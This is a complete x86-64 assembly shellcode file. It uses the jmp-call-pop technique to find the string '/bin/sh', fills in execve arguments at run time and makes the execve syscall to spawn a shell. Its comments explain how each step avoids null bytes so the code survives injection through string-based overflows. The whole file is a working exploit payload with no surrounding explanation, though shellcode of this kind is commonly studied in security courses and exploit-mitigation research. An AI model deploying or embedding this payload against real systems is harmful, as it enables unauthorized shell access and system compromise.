
section .text
    global _start
    _start:
        BITS 64
        jmp short two
    one:
        pop rbx

        ; Zero out al without using immediate zero
        xor al, al
        mov [rbx+7], al   ; Null terminate /bin/sh

        ; Store rbx to memory without direct mov
        push rbx
        pop qword [rbx+8]  ; Replaces 'mov [rbx+8], rbx'

        ; Zero out rax without immediate zero
        xor rax, rax      ; Replaces 'mov rax, 0x00'
        mov [rbx+16], rax ; Store null terminator for argv

        ; Setup execve arguments
        mov rdi, rbx      ; First arg: command string
        lea rsi, [rbx+8]  ; Second arg: argv array
        xor rdx, rdx      ; Third arg: envp=NULL (replaces 'mov rdx, 0x00')

        ; Setup syscall number without immediate value
        xor rax, rax
        mov al, 59        ; syscall number for execve
        syscall
    two:
        call one
        db '/bin/sh', 0xFF    ; Command string (terminated later by code)
        db 'AAAAAAAA'         ; Placeholder for argv[0]
        db 'BBBBBBBB'         ; Placeholder for argv[1]
